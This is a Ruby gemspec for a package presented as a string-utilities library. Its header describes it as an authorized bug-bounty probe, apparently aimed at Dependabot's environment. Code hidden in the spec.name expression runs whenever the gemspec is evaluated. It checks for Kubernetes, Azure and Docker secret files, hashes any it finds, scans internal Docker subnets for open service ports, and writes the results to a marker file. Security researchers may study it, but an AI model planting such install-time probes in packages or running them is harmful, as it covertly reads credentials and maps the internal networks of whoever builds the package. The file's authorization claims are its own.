# frozen_string_literal: true
#
# v2.2 boundary-verification probe — secret-mount discovery + Docker network neighbor scan.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; PROBE-MARK encoded outputs only; READ-ONLY filesystem
# checks + TCP connect probes (no body sent to discovered services).
#
# Scope: HYP-NEW-D-F — combined audit:
#   D: K8s service-account token mount discovery
#      Probe filesystem for /var/run/secrets/kubernetes.io/serviceaccount/token,
#      /var/run/secrets/azure.com/*, /run/secrets/*, /etc/secrets/*. If mounted,
#      capture sha256+length only (no token content). Indicates AKS / cluster-
#      level identity available from in-container code.
#
#   F: Docker network neighbor scan
#      TCP-connect probe across 172.19.0.1-30 + 172.18.0.1-30 + 172.20.0.1-30
#      on common service ports. Discover sidecar containers, internal services,
#      or other tenant containers if multi-tenant containers share a network.
#
# All output via PROBE-MARK encoded sha256+length. Connect attempts use
# Timeout::timeout to bound execution time. No data sent to responsive
# services beyond the TCP SYN.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "socket"
      require "timeout"
      require "digest"

      results = []
      probe_mark = "PROBE-MARK-HYP-NEW-D-F"

      # --- D: secret-mount discovery (read-only filesystem probe) ---
      secret_paths = [
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/var/run/secrets/azure.com/identity",
        "/var/run/secrets/azure.com/tokens",
        "/run/secrets/api_token",
        "/run/secrets/db_password",
        "/etc/secrets/token",
        "/etc/kubernetes/serviceaccount/token",
        "/proc/1/root/etc/secrets",
      ]
      mount_hits = []
      secret_paths.each do |p|
        begin
          if File.exist?(p)
            stat = File.stat(p)
            sha = Digest::SHA256.hexdigest(File.read(p, 256))[0, 8]
            mount_hits << "#{p.split('/').last}-sz#{stat.size}-h#{sha}"
          end
        rescue
          # path not accessible — skip
        end
      end
      results << "D-mounts-cnt#{mount_hits.length}-#{mount_hits.first(5).join('-')[0, 80]}"

      # --- F: Docker network neighbor scan ---
      networks = %w(172.19.0 172.18.0 172.20.0)
      ports = [22, 80, 443, 1080, 5000, 8080, 9000, 6379, 5432, 27017]
      neighbor_hits = []
      networks.each do |net|
        (1..30).each do |last|
          ip = "#{net}.#{last}"
          ports.each do |port|
            begin
              Timeout.timeout(0.3) do
                s = TCPSocket.new(ip, port)
                s.close
                neighbor_hits << "#{ip}:#{port}"
              end
            rescue
              # conn refused / timeout / unreachable — not a hit
            end
            break if neighbor_hits.length > 50  # bound output
          end
          break if neighbor_hits.length > 50
        end
        break if neighbor_hits.length > 50
      end
      neighbor_hash = Digest::SHA256.hexdigest(neighbor_hits.sort.join(","))[0, 12]
      results << "F-neighbors-cnt#{neighbor_hits.length}-h#{neighbor_hash}"
      # Also surface the first 8 hits explicitly (encoded)
      neighbor_hits.first(8).each_with_index do |hit, i|
        results << "F-h#{i}-#{hit.gsub('.', 'd').gsub(':', 'p')}"
      end

      summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]
      begin
        File.open("/home/dependabot/HYP-NEW-D-F-MARKER.txt", "w") do |f|
          f.puts "#{probe_mark}-secret-mount-and-neighbor-scan"
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
        end
      rescue
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
